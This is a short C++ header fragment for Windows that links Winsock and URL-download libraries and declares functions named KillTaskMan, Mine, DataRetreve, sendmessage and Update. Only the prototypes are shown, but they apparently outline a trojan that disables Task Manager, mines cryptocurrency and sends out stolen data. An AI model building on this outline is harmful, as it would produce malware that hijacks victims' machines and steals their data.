#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib,"urlmon.lib")
#include <WinSock2.h>
#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <string>
#include <urlmon.h>
#include <fstream>
#include <Shlobj.h>
#include <tchar.h>
#include <sstream>
#include <vector>

int sendmessage(std::string data);
void Sstart();
//void GSax();
void Update(std::string web);
void MessageBox1();
void KillTaskMan();
void Mine();
void DataRetreve();